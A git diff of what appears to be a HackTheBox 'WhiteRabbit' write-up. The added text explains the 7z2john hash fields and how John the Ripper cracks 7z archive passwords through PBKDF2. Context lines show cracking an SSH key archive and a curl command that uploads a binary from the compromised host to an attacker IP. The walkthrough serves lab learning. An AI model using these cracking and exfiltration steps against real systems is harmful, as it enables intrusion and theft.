@@ -460,6 +460,43 @@ Sub items Errors: 3
 
 Well, the password we found turned out to be invalid
 
+`7z2john` is one of the `John the Ripper` tools that extracts from a `.7z` archive everything necessary for automatic password cracking with `john`, namely:
+
+$`7z`$[`version`]$[`iteration`]$[`padding`]$[`compression type`]$[`salt_size`]$[`salt`]$[`iv_size`]$[`IV`]$[`data size`]$[`data offset`]$[`encrypted_data`]$[`crc32`]
+
++ `$7z$` - Prefix: indicates the hash type (`7z` archive format)
++ `version` - Version of the encryption format (usually `2`)
++ `iteration` - Number of PBKDF2 iterations. Usually `2^19` (524288)
++ `padding` - How many bytes need to be ignored (padding) at the end of the decrypted block before verification
++ `compression` - Numeric identifier of the compression algorithm used before encryption
++ `salt_size` - Length of the salt (e.g., 8 bytes)
++ `salt` - The salt value itself
++ `iv_size` - Length of the IV in bytes (e.g., 8 or 16)
++ `iv` - Initialization Vector as a hex string, used in the first block of encryption to make the result unpredictable
++ `data_size` - Size of the encrypted data (in bytes)
++ `data_offset` - Offset in the archive where this encrypted data begins
++ `encrypted_data` - The encrypted block, represented as a hex string. Used for password verification
++ `crc32` - Checksum for validating the decrypted block
+
+All of this information is stored in the metadata of the `7z` archive. This allows tools like john to speed up password cracking and avoid repeatedly parsing the archive structure
+to retrieve the necessary parameters during the attack
+
+When performing password cracking, we are in fact trying to derive the **encryption key**, not the password itself.  
+It's important to note that the key is **recomputed every time** from `password + salt + iteration count`  using the `PBKDF2` algorithm (or a similar key derivation function):
+
+```key = PBKDF2(password, salt, iterations)```
+`PBKDF2` (Password-Based Key Derivation Function 2)
+`password` → the user input
+`salt` → random bytes stored in the archive header
+`iterations` → the number of hash function repetitions (usually 2^19 or more)
+
+This is why, with the hash created by `7z2john`, john will try to crack the password as follows:
+   + iterate through each candidate word from the wordlist
+   + compute `PBKDF2(password, salt, iter_count)` → key
+   + attempt to decrypt the `AES-encrypted` block
+   + check if the result is valid
+   + if valid → the correct password has been found
+
 ```
 Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ 7z2john dev/shm/bob/ssh/bob.7z > bob.hash
 
@@ -669,7 +706,7 @@ morpheus@whiterabbit:/opt/neo-password-generator$ cp neo-password-generator ~/ne
 curl -F "file=@neo-password-generator" http://10.10.16.43:1818/
 ```
 
-```
+```py
 from ctypes import CDLL
 import datetime
 
